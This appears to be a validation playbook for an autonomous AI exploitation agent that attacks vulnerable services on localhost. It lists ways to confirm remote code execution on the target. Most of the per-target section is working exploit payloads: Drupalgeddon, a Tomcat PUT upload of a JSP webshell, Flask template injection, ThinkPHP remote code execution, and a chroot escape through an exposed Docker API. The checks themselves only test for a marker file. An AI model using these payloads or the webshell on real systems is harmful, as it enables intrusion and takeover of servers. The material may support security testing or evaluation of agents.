# Exploitation Validation Playbook

## Overview

After executing an exploit against a target, the agent must confirm it has achieved RCE on the target system (not its own machine). This is critical when agent and target run on similar Linux systems (e.g., EC2 instances sharing common attributes).

## 3-Layer Fallback Approach

The validation uses three layers. Each layer falls through to the next if unavailable or inconclusive.

### Layer 1 — Identity Check (L1)

**Principle**: Agent places a marker file at `/tmp/agent_is_present` on its own machine. If the exploited target lacks this file, the agent is confirmed to be on a different system.

```bash
# On the AGENT machine (before exploitation):
touch /tmp/agent_is_present

# On the TARGET (during exploitation):
[ ! -f /tmp/agent_is_present ] && echo "L1_PASS" || echo "L1_FAIL"
```

**Interpretation**:
- `L1_PASS` → Confirmed on target (marker absent)
- `L1_FAIL` → Inconclusive (marker could exist on target from previous run)

**Fallback trigger**: L1 fails if marker file accidentally present on target (e.g., from a previous test run). In this case, fall through to L2.

### Layer 2 — Environment Fingerprinting (L2)

**Principle**: Container environments have different network interfaces, hostnames, and cgroup configurations than the host.

```bash
# Check network interfaces
ip a | grep -E '172\.(1[6-9]|2[0-9]|3[01])' && echo "L2_CONTAINER_NET"

# Check hostname (Docker containers often use container ID)
hostname | grep -qE '^[a-f0-9]{12}$' && echo "L2_CONTAINER_HOSTNAME"

# Check Docker cgroup
cat /proc/1/cgroup | grep -q docker && echo "L2_DOCKER_CGROUP"
```

**Interpretation**:
- Any `L2_*` match → Confirmed on target (container environment detected)
- No matches → Inconclusive (could be host)

**Fallback trigger**: All L2 checks fail or return empty (target may not be a container). Fall through to L3.

### Layer 3 — Unique Artifact Creation (L3)

**Principle**: Create a timestamped proof file on the target and verify its existence. This also serves as an audit trail.

```bash
# Create unique artifact
touch /tmp/pwned_$(date +%s_%N)

# Verify it was created (on the target)
ls -la /tmp/pwned_*
```

**Interpretation**:
- File created successfully → Confirmed RCE
- File creation fails → RCE not achieved

## Per-Target Validation Commands

### Drupal (CVE-2018-7600)

```bash
CMD="[ ! -f /tmp/agent_is_present ] && echo L1_PASS || echo L1_FAIL"
curl -k -s 'http://localhost:8081/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  --data "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=${CMD}"
```

### Tomcat (CVE-2017-12615)

```bash
# Upload webshell (if not already uploaded)
curl -X PUT 'http://localhost:8082/val.jsp/' -d '<%@ page import="java.io.*" %><% String c = request.getParameter("c"); Process p = Runtime.getRuntime().exec(c); BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while ((l = r.readLine()) != null) out.println(l); %>'

# Run L1 check
curl -s 'http://localhost:8082/val.jsp?c=[ ! -f /tmp/agent_is_present ] && echo L1_PASS || echo L1_FAIL'
```

### Flask SSTI

```bash
curl -s 'http://localhost:8000/?name={{ lipsum.__globals__["os"].popen("[ ! -f /tmp/agent_is_present ] && echo L1_PASS || echo L1_FAIL").read() }}'
```

### ThinkPHP (CVE-2018-20062)

```bash
curl -s "http://localhost:8083/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=[ ! -f /tmp/agent_is_present ] && echo L1_PASS || echo L1_FAIL"
```

### Docker API

```bash
# Create container and run L1 check
EXEC_ID=$(curl -s -X POST -H 'Content-Type: application/json' \
  'http://localhost:2375/containers/exploit/exec' \
  -d '{"AttachStdout":true,"Cmd":["chroot","/mnt","sh","-c","[ ! -f /tmp/agent_is_present ] && echo L1_PASS || echo L1_FAIL"]}' | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
curl -s -X POST "http://localhost:2375/exec/${EXEC_ID}/start" -d '{}'
```

## Reporting Validation Results

After validation, report to the central API:

```json
{
  "agentId": "AGT-<uuid>",
  "targetName": "<target>",
  "cveId": "<CVE>",
  "timestamp": "<ISO-8601>",
  "success": true,
  "validationLayersUsed": ["L1", "L3"],
  "validationOutput": {
    "L1": "L1_PASS (marker file absent)",
    "L3": "/tmp/pwned_1717344000_123456789"
  }
}
```
